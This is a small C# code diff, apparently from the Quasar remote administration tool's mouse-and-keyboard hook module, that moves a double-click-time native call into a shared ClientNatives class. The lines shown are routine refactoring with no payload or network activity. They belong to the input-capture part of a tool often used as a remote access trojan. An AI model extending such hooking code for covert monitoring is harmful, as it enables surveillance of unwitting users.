@@ -5,6 +5,7 @@
 using System;
 using System.Windows.Forms;
 using Quasar.Client.MouseKeyHook.WinApi;
+using Quasar.Client.Utilities;
 
 namespace Quasar.Client.MouseKeyHook.Implementation
 {
@@ -20,7 +21,7 @@ namespace Quasar.Client.MouseKeyHook.Implementation
         public GlobalMouseListener()
             : base(HookHelper.HookGlobalMouse)
         {
-            m_SystemDoubleClickTime = MouseNativeMethods.GetDoubleClickTime();
+            m_SystemDoubleClickTime = ClientNatives.GetDoubleClickTime();
             m_xDoubleClickThreshold = NativeMethods.GetXDoubleClickThreshold();
             m_yDoubleClickThreshold = NativeMethods.GetYDoubleClickThreshold();
         }
